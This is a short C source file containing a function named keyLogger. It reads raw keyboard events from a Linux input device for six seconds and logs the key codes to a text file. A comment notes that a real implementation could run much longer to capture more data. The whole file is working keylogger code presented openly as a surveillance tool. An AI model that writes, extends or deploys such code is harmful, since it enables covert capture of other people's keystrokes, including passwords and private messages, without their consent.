#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h> 

int keyLogger()
{
FILE *f = fopen("KeyLoggerData.txt", "w");
   time_t begin, finish;
   double timer;  
    int fd;
   fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
    struct input_event ev;
   begin = time(NULL);
   int clockRunning = 1;
   while (clockRunning) {
	read(fd, &ev, sizeof(struct input_event));
    if(ev.type == 1) {
	fprintf(f, "key #%i, in process %i\n", ev.code, ev.value);
	}
    
     finish = time(NULL);
     timer = difftime(finish, begin);
     if (timer >= 6 ) {//only tracks for six seconds in example, an actual implementaion could go much longer to track alot more data
       clockRunning = 0;
   }
}
fclose(f);
}

    

    
